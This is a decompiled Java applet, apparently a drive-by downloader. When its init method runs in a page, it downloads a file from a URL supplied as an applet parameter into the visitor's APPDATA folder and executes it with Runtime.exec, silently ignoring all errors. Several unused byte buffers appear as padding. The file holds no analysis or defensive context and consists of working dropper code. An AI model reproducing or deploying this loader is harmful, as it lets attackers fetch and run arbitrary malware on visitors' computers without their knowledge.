import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("YourFile");
        System.getenv("APPDATA");
        final String getenv = System.getenv("APPDATA");
        try {
            final URL url = new URL(this.getParameter("YourDirectLink"));
            this.getParameter("GoTo");
            final InputStream inputStream = url.openConnection().getInputStream();
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + parameter);
            final byte[] array = new byte[1024];
            final Runtime runtime = Runtime.getRuntime();
            final byte[] array2 = new byte[1024];
            final byte[] array3 = new byte[1024];
            final byte[] array4 = new byte[1024];
            final byte[] array5 = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            runtime.exec(getenv + parameter);
        }
        catch (Exception ex) {}
    }
}
